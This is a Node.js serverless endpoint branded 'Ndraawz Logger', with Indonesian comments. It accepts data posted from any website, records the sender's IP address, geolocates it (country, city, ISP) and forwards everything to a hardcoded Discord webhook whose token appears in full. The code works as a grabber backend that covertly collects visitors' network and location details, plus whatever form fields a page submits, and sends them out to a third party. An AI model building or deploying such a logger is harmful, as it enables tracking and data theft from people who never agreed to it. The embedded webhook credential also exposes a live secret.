// api/log.js
const https = require('https');

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

// Fungsi untuk ambil geolokasi dari IP
function getGeoInfo(ip) {
    return new Promise((resolve) => {
        // Timeout 3 detik
        const timeout = setTimeout(() => {
            console.log(`Timeout getting geo for IP: ${ip}`);
            resolve(null);
        }, 3000);
        
        https.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,org,query`, (geoRes) => {
            let data = '';
            geoRes.on('data', chunk => data += chunk);
            geoRes.on('end', () => {
                clearTimeout(timeout);
                try {
                    const json = JSON.parse(data);
                    if (json.status === 'success') {
                        console.log(`Geo success for ${ip}: ${json.country}`);
                        resolve({
                            country: json.country || "N/A",
                            region: json.regionName || "N/A",
                            city: json.city || "N/A",
                            isp: json.isp || "N/A",
                            as: json.as || "N/A",
                            org: json.org || "N/A"
                        });
                    } else {
                        console.log(`Geo failed for ${ip}: ${json.message || 'unknown'}`);
                        resolve(null);
                    }
                } catch (e) {
                    console.log(`Parse error for ${ip}: ${e.message}`);
                    resolve(null);
                }
            });
        }).on('error', (err) => {
            clearTimeout(timeout);
            console.log(`Request error for ${ip}: ${err.message}`);
            resolve(null);
        });
    });
}

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    // Baca body
    let body = '';
    await new Promise((resolve) => {
        req.on('data', chunk => body += chunk);
        req.on('end', resolve);
    });

    // Ambil IP dari header request
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
    console.log(`[LOG] Received from IP: ${clientIp}`);

    try {
        const data = JSON.parse(body);
        console.log(`[LOG] Fields count: ${data.fields ? data.fields.length : 0}`);
        
        // Ambil geolokasi dari IP (dengan timeout)
        let geoData = null;
        try {
            geoData = await getGeoInfo(clientIp);
        } catch (e) {
            console.log(`Geo error: ${e.message}`);
        }
        
        // Jika geoData gagal, pakai default
        if (!geoData) {
            geoData = {
                country: "Tidak diketahui",
                region: "Tidak diketahui",
                city: "Tidak diketahui",
                isp: "Tidak diketahui",
                as: "N/A",
                org: "N/A"
            };
        }
        
        // Buat fields untuk embed
        const allFields = [
            ...(data.fields || []),
            { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
            { name: "📡 IP Address", value: clientIp, inline: false },
            { name: "🚩 Country", value: geoData.country, inline: false },
            { name: "📍 Region", value: geoData.region, inline: false },
            { name: "🏙️ City", value: geoData.city, inline: false },
            { name: "🏢 ISP", value: geoData.isp, inline: false },
            { name: "📡 AS / Org", value: `${geoData.as} / ${geoData.org}`, inline: false }
        ];
        
        const embed = {
            title: "🚀 Ndraawz Logger",
            color: 0x00ff88,
            fields: allFields,
            timestamp: new Date().toISOString()
        };
        
        // Kirim ke Discord
        const payload = JSON.stringify({ embeds: [embed] });
        const url = new URL(DISCORD_WEBHOOK);
        const options = {
            hostname: url.hostname,
            path: url.pathname,
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        };
        
        const discordReq = https.request(options, (discordRes) => {
            let discordBody = '';
            discordRes.on('data', chunk => discordBody += chunk);
            discordRes.on('end', () => {
                console.log(`[LOG] Discord response: ${discordRes.statusCode}`);
                if (discordRes.statusCode === 204 || discordRes.statusCode === 200) {
                    res.status(200).json({ ok: true });
                } else {
                    console.log(`[LOG] Discord error: ${discordBody}`);
                    res.status(200).json({ ok: true, discordStatus: discordRes.statusCode });
                }
            });
        });
        
        discordReq.on('error', (err) => {
            console.error(`[LOG] Discord request error: ${err.message}`);
            res.status(200).json({ ok: false, error: err.message });
        });
        
        discordReq.write(payload);
        discordReq.end();
        
    } catch (err) {
        console.error(`[LOG] Parse error: ${err.message}`);
        res.status(400).json({ error: 'Invalid JSON' });
    }
};
